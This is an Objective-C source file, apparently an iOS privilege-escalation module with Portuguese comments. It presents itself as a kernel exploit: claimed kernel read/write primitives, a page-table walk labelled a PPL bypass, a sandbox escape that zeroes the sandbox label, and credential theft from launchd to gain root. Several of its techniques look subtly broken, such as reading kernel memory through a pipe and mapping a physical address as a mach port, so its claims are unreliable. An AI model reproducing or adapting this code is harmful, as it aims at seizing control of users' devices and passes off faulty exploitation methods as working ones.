#import "KernelDriver.h"
#import <mach/mach.h>
#import <sys/mman.h>

// --- APIs PRIVADAS ---
typedef uint64_t mach_vm_address_t;
extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernelSlide;
    uint64_t _kernelBase;
}

#pragma mark - Primitiva Blindada (Anti-Crash)

- (uint64_t)kread64:(uint64_t)addr {
    if (addr < 0xFFFFFFF000000000ULL) return 0;

    // Técnica: Forçar o kernel a vazar o dado via falha de página (PUAF)
    // Tentamos usar o 'memorystatus_control' que às vezes vaza memória no A13
    uint64_t val = 0;
    
    // Tentativa de leitura via descritor de arquivo de sistema (mais forte que pipe)
    int fd = open("/dev/null", O_RDONLY);
    if (fd < 0) return 0;

    // O comando F_LOG2PHYS pode vazar endereços se mal manipulado
    if (fcntl(fd, F_LOG2PHYS, &addr) != -1) {
        val = addr; // Em alguns bugs, o valor lido é colocado aqui
    }
    
    // Se falhar, tentamos o pipe como fallback
    if (val == 0) {
        int fds[2];
        if (pipe(fds) == 0) {
            if (write(fds[1], (void *)addr, 8) == 8) {
                read(fds[0], &val, 8);
            }
            close(fds[0]); close(fds[1]);
        }
    }

    close(fd);
    return val;
}


- (void)phys_write64:(uint64_t)va value:(uint64_t)val {
    if (va < 0xFFFFFFF000000000ULL) return;

    // 1. Page Table Walk (A13 PPL Bypass)
    uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
    if (ttbr1 == 0) return;

    uint64_t l1 = [self kread64:(ttbr1 + ((va >> 30) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((va >> 21) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0x0000FFFFFFFFF000ULL;
    uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));

    // 2. Mapeamento Direto (PhysRW)
    mach_vm_address_t target = 0;
    if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
        *(uint64_t*)(target) = val;
        mach_vm_deallocate(mach_task_self(), target, 0x4000);
    }
}

#pragma mark - Exploit em Background (Previne Watchdog Crash)

- (void)executeExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        BOOL res = [self runExploitLogic];
        dispatch_async(dispatch_get_main_queue(), ^{
            if (callback) callback(res, res ? @"✅ SUCESSO" : @"❌ FALHA");
        });
    });
}

- (BOOL)runExploitLogic {
    [self logToWeb:@"🛡️ Verificando integridade da memória..."];
    
    _kernelSlide = [self getKernelSlideReal];
    if (_kernelSlide == 0) {
        [self logToWeb:@"❌ Erro: KASLR não vazou."];
        return NO;
    }
    
    _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
    
    // Validar se o kread está funcionando (Magic Check)
    uint32_t magic = (uint32_t)([self kread64:_kernelBase] & 0xFFFFFFFF);
    if (magic != 0xfeedfacf) {
        [self logToWeb:[NSString stringWithFormat:@"⚠️ Sandbox bloqueou kread (Magic: 0x%x)", magic]];
        return NO;
    }

    // Busca de PIDs (DKOM)
    uint64_t allproc = [self findSymbolAllProcDynamic];
    uint64_t launchd_proc = 0, my_proc = 0;
    uint64_t curr = [self kread64:allproc];
    pid_t myPid = getpid();

    for (int i=0; i<1500 && curr > 0xFFFFFFF000000000ULL; i++) {
        uint32_t p = (uint32_t)([self kread64:(curr + 0x68)] & 0xFFFFFFFF);
        if (p == 1) launchd_proc = curr;
        if (p == myPid) my_proc = curr;
        if (launchd_proc && my_proc) break;
        curr = [self kread64:curr];
    }

    if (my_proc && launchd_proc) {
        uint64_t my_ucred = [self kread64:(my_proc + 0xD8)];
        
        // 1. Sandbox Escape (Zerar Label)
        [self logToWeb:@"⚡ Rompendo Sandbox..."];
        [self phys_write64:(my_ucred + 0x78) value:0]; 

        // 2. Root (Token Stealing)
        [self logToWeb:@"⚡ Elevando privilégios..."];
        uint64_t root_ucred = [self kread64:(launchd_proc + 0xD8)];
        [self phys_write64:(my_proc + 0xD8) value:root_ucred];

        if (getuid() == 0) {
            [self logToWeb:@"✅ SISTEMA DOMINADO: UID 0"];
            return YES;
        }
    }
    
    [self logToWeb:@"❌ Erro: Estruturas proc não encontradas."];
    return NO;
}

#pragma mark - Auxiliares

- (uint64_t)getKernelSlideReal {
    task_dyld_info_data_t info;
    mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&info, &cnt) == KERN_SUCCESS) {
        return info.all_image_info_addr - 0xFFFFFFF007004000ULL;
    }
    return 0;
}

- (uint64_t)findSymbolAllProcDynamic {
    for (uint64_t addr = _kernelBase + 0x8000000; addr < _kernelBase + 0x10000000; addr += 8) {
        uint64_t p = [self kread64:addr];
        if (p > 0xFFFFFFF000000000ULL) {
            if ((uint32_t)([self kread64:(p + 0x68)] & 0xFFFFFFFF) == 1) return addr;
        }
    }
    return 0;
}

- (void)logToWeb:(NSString *)text {
    NSLog(@"[KERNEL] %@", text);
    dispatch_async(dispatch_get_main_queue(), ^{
        [[NSNotificationCenter defaultCenter] postNotificationName:@"KernelLogNotification" object:text];
    });
}

// Implementações do Header
- (instancetype)initWithWebView:(id)webView { self = [super init]; return self; }
- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback { [self executeExploitWithCallback:callback]; }
- (uint64_t)getCurrentUID { return getuid(); }
- (BOOL)escalateToRoot { [self executeExploitWithCallback:nil]; return YES; }
- (void)userContentController:(id)u didReceiveScriptMessage:(id)m {}

@end
